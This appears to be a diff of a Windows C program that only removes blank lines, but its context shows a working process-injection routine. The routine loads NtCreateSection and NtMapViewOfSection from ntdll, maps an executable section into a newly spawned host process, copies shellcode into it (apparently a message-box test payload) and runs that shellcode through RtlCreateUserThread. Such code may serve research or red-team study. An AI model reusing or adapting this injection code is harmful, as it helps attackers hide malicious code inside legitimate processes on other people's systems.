@@ -3,7 +3,6 @@
 //
 // Definitions
 //
-
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 
 typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
@@ -38,7 +37,6 @@ INT main() {
 	//
 	// Load required functions from ntdll
 	//
-
 	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
 	pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
 	pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
@@ -47,7 +45,6 @@ INT main() {
 	//
 	// Create a section
 	//
-
 	ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 	if (!NT_SUCCESS(ntStatus)) {
 		return ntStatus;
@@ -56,7 +53,6 @@ INT main() {
 	//
 	// Map section to local process
 	//
-
 	ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_READWRITE);
 	if (!NT_SUCCESS(ntStatus)) {
 		return ntStatus;
@@ -65,7 +61,6 @@ INT main() {
 	//
 	// Create host process
 	//
-
 	ZeroMemory(&startupInfo, sizeof startupInfo);
 	startupInfo.cb = sizeof startupInfo;
 	ZeroMemory(&processInformation, sizeof processInformation);
@@ -84,7 +79,6 @@ INT main() {
 	//
 	// Map section to target process
 	//
-
 	ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
 	if (!NT_SUCCESS(ntStatus)) {
 		lRetVal = ntStatus;
@@ -94,7 +88,6 @@ INT main() {
 	//
 	// copy shellcode to the local view, which will get reflected in the target process's mapped view
 	//
-
 	memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);
 
 	ntStatus = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteSectionAddress, NULL, &hThread, NULL);
